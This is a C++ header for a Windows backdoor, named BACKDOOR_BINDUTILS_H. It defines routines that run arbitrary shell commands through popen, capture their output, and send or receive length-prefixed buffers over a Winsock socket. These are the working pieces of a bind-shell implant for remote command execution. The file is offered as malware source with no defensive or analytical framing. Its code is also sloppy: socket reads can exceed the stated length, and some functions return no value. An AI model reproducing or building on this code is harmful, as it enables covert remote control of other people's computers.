//
// Created by stdout on 2021/4/5.
//

#ifndef BACKDOOR_BINDUTILS_H
#define BACKDOOR_BINDUTILS_H

#include <cstdlib>
#include <cstring>
#include "string"
#include "winsock2.h"
#include "cstdio"
#include "windows.h"
#pragma comment(lib,"ws2_32.lib")

#define PAGE_SIZE 1024

namespace dktb {

    typedef struct {
        int size;
        unsigned char *buf;
    }BUFFER;

    static unsigned char *GetZeroMem(int BufferSize) {
        unsigned char *buffer = (unsigned char *) malloc(sizeof(char) * BufferSize);
        if (buffer == nullptr) {
            return nullptr;
        }
        memset(buffer, 0, BufferSize * sizeof(char));
        return buffer;
    }

    static BUFFER *ExecuteCommand(char *cmd) {
        dktb::BUFFER *result = (dktb::BUFFER*)malloc(sizeof(dktb::BUFFER));
        result->buf = GetZeroMem(PAGE_SIZE);
        result->size = 0;

        FILE *p = popen(cmd, "rb");
        int PageNumber = 1;

        char ch = 0;
        while ((ch = fgetc(p)) != EOF) {
            result->buf[result->size] = ch;
            result->size++;
            if (result->size % PAGE_SIZE == 0) {
                PageNumber++;
                result->buf = (unsigned char*)realloc(result->buf, PAGE_SIZE * PageNumber);
            }
        }
        pclose(p);
        return result;


    }

    static BUFFER *RecvData(SOCKET socket) {
        char length[10] = {0};
        recv(socket, length, 10, 0);
        BUFFER *result = (BUFFER*)malloc(sizeof(BUFFER));
        result->size = atoi(length);
        result->buf = GetZeroMem(result->size + 0x10);
        recv(socket, (char *)result->buf, result->size + 0x10, 0);
        return result;
    }

    static void *SendData(SOCKET socket, BUFFER *result) {
        char length[10] = {0};
        itoa(result->size, length, 10);

        send(socket, length, strlen(length), 0);
        send(socket, (char*)result->buf, result->size + 1, 0);
    }

    static BUFFER * Char2Buffer(char *s) {
        BUFFER *bf = (BUFFER*)malloc(sizeof(BUFFER));
        bf->size = strlen(s);
        bf->buf = GetZeroMem(bf->size + 0x10);
        memcpy(bf->buf, s, bf->size);
        return bf;
    }

    static void *PrintBuffer(BUFFER *bf) {
        fwrite(bf->buf, 1, bf->size, stdout);
    }

    static void DeleteBuffer(BUFFER *bf) {
        free(bf->buf);
        free(bf);
    }
}
#endif //BACKDOOR_BINDUTILS_H
